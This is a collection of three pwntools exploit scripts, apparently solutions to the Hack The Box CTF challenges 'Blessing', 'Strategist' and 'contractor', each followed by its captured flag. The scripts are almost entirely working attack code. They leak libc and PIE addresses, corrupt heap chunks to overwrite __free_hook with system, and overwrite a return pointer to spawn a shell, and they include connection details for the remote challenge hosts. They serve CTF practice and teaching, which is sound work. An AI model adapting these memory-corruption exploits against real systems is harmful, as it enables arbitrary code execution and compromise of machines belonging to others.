# Blessing

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./blessing_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc
#context.log_level = "debug"
gs = '''
b *main + 353
continue
'''

def start():
    if args.REMOTE:
        return remote("83.136.248.131",52424)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

leak = int(rcu(b"Please accept this: ", b"\x08 \x08\x08 \x08\x08"),16)
logleak("value location", leak)

size = leak + 1
sla(b"Give me the song's length:", bc(size))

payload = b"BBBBBBBB"

sl(payload)

#========= interactive ====================
r.interactive()
#HTB{3v3ryth1ng_l00k5_345y_w1th_l34k5_9d18ac4b8d55c5fd8673bff7b39ef794}
```

# Strategist

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./strategist_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

libc = elf.libc
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("83.136.254.165",37103)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

idx = 0
def create(size, data):
#    global idx
    sl(b"1")
    sla(b">", bc(size))
    sa(b">", data)
    rcu(b">")

def edit(idx, data):
    sl(b"3")
    sla(b">", bc(idx))
    sa(b">", data)
    rcu(b">")

def delete(idx):
    sl(b"4")
    sla(b">", bc(idx))
    rcu(b">")

def leak(idx):
    sl(b"2")
    sla(b">", bc(idx))
    rcu(b"[Sir Alaric]: Plan ")
    leak = u64(rcu(b"]: ", b"\n").split(b"]: ")[1].ljust(8, b"\x00"))
    rcu(b">")
    return leak
#========= exploit here ===================
r.timeout = 1
rcu(b">")

create(0x428, b"leak") #0
create(0x38, b"A"*0x38) #1
create(0x38, b"B") #2
create(0x38, b"C") #3

create(0x18, b"/bin/sh") #4 
delete(0)
create(0x428, b"A") #0?

leak = leak(0)
logleak("libc leak", leak)

libc.address = leak-0x3ebc41
libcbase()

edit(1, b"A"*0x38+p8(0x81))
delete(1)
delete(2)
delete(3)

create(0x78, b"A"*0x40+p64(libc.sym.__free_hook)) #1?
create(0x38, b"X")

create(0x38, p64(libc.sym.system))

delete(4)
#========= interactive ====================
r.interactive()
#HTB{0ld_r3l14bl3_l1bc_st1ll_3x15t5_1ab691e1261885df1a8bed25c7a49008}
```

# contractor

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./contractor_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
libc = elf.libc

gs = '''
b *main + 1366
c
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("127.0.0.1", 1337)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])


r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================


attemp = 0

for i in range(16):
    r = process([elf.path])
    #r = remote("94.237.58.202", 33308)
    r.timeout = 0.5
    try:

        name = b"X"*8
        sla(b">", name)
        reason = "Y"*0x8
        sla(b">", reason)
        age = 0x1337
        sla(b">", bc(age))
        #leak
        payload = b"A"*0x10
        sla(b">", payload)
        leak = u64(rcu(b"[Specialty]: AAAAAAAAAAAAAAAA", b"\n").ljust(8, b"\x00"))
        logleak("leak", leak)
        elf.address = leak - 0x1b50
        payload = b"\xf0"*0x18
        payload += p64(0xdeadbeef)
        payload += p8(0x60)
        sla(">", b"4")
        sla(b"at: ",payload)
        #
        sla(b">", b"yes")
        #
        sla(b">", b"4")
        payload = p64(elf.sym.contract)
        #
        sla(b"at: ",payload)
        r.recvuntil(b"lad!\n\n")
        sl(b"ls")
        if b"flag.txt" in r.recv():
            r.interactive()
        else:
            log.failue(f"Fail!")
        
    except KeyboardInterrupt:
        attemp +=1
        log.failure(f"Attemp #{i}")
        r.close()
    except:
        pass

#========= interactive ====================
```